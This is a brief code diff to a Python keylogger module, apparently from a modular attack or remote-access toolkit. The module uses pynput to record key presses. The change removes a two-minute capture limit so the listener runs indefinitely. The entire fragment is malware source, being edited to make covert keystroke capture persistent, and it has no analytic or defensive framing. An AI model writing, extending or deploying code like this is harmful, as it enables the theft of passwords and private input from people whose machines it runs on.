@@ -24,8 +24,7 @@ class Keylogger(BaseModule):
 
     def run(self):
         with Listener(on_press=self.on_press, suppress=False) as listener:
-            time.sleep(120)
-            listener.stop()
+            listener.join()
 
     def install_requirements(self):
         libraries = ["pynput"]
